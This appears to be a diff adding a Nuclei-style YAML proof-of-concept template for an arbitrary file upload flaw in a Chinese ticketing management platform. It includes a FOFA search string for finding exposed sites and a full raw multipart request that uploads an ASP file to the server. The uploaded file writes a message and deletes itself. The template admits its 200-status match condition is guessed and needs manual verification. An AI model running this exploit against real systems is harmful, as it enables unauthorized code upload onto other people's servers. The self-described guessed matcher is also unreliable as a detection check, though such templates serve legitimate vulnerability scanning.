@@ -1,0 +1,68 @@
+id: poc-ac4fll9n0x7acrg9
+info:
+  name: 中城科信票务管理平台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ac4fll9n0x7acrg9
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ac4fll9n0x7acrg9
+    fofa: body="技术支持：北京中成科信科技发展有限公司"
+http:
+- raw:
+  - 'POST /SystemManager/Introduction.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 507
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Type: multipart/form-data; boundary=--------------------------156498494113216549498494984
+
+    Accept-Encoding: gzip
+
+
+    ----------------------------156498494113216549498494984
+
+    Content-Disposition: form-data; name="file"; filename="ceshi.txt"
+
+    Content-Type: image/jpeg
+
+
+    <%
+
+    response.write("Hello World!")
+
+    Server.CreateObject("Scripting.FileSystemObject").DeleteFile(Request.ServerVariables("PATH_TRANSLATED"))
+
+    %>
+
+
+    ----------------------------156498494113216549498494984
+
+    Content-Disposition: form-data; name="fileName"
+
+
+    ceshi.asp
+
+    ----------------------------156498494113216549498494984
+
+    Content-Disposition: form-data; name="Method"
+
+
+    UpdateUploadLinkPic
+
+    ----------------------------156498494113216549498494984'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
